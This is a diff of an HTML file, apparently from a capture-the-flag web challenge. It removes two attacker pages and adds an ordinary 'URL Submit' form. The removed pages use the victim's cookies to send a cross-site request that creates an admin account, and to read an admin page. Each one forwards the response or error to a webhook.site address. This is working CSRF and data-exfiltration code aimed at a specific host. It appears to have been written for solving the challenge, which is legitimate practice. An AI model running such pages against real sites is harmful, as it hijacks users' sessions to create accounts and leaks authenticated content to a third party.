@@ -1,76 +1,88 @@
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-  // Отправляем POST-запрос на create_admin от имени жертвы
-  fetch('http://tasks.goidactf.ru:20309/create_admin', {
-    method: 'POST',
-    credentials: 'include',  // ← обязательно для отправки кук
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Referer': 'http://tasks.goidactf.ru:20309/admin',
-      'Origin': 'http://tasks.goidactf.ru:20309'
-    },
-    body: 'new_admin_login=123'
-  })
-  .then(res => {
-    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!
-    return res.text().then(body => ({
-      status: res.status,
-      headers: [...res.headers.entries()],
-      body: body
-    }));
-  })
-  .then(data => {
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-      method: 'POST',
-      body: JSON.stringify(data),
-      headers: { 'Content-Type': 'application/json' }
-    });
-  })
-  .catch(err => {
-    // Если CORS блокирует — попадём сюда
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-      method: 'POST',
-      body: JSON.stringify({ error: err.toString() }),
-      headers: { 'Content-Type': 'application/json' }
-    });
-  });
-</script>
-</body>
-</html><!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>URL Submit</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        #container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="text"] {
+            width: 300px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #status {
+            margin-top: 10px;
+        }
+
+        #admin-link {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+
+    </style>
 </head>
 <body>
-    <script>
-        fetch('http://tasks.goidactf.ru:20309/admin', {
-  method: 'GET',
-  credentials: 'include',
-})
-.then(res => {
-  // Получаем заголовки (если разрешены CORS)
-  let headers = [];
-  for (let [k, v] of res.headers.entries()) {
-    headers.push(k + ': ' + v);
-  }
-  return res.text().then(body => ({ headers, body }));
-})
-.then(data => {
-  fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-    method: 'POST',
-    body: JSON.stringify(data),
-    headers: { 'Content-Type': 'application/json' }
-  });
-}).catch(data => {
-  fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-    method: 'POST',
-    body: JSON.stringify(data),
-    headers: { 'Content-Type': 'application/json' }})}
-  );
-    </script>
-</body>
-</html>
+
+<a id="admin-link" href="/admin">Admin</a>
+
+<div id="container">
+    Visitor
+    <input type="text" id="urlInput" placeholder="Enter URL">
+    <button onclick="submitURL()">Submit</button>
+    <div id="status">Automatic page status: 200 OK. 
+                I'l check it ruchkami in a few minutes</div>
+</div>
+
+
+<script>
+    function submitURL() {
+        const url = document.getElementById('urlInput').value;
+        const statusDiv = document.getElementById('status');
+
+        fetch('/get_url', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ url: url })
+        })
+            .then(response => {
+                statusDiv.textContent = `Automatic page status: ${response.status} ${response.statusText}. 
+                I'l check it ruchkami in a few minutes`;
+                return response.status;
+            });
+    }
+</script>
+
+
+</body></html>
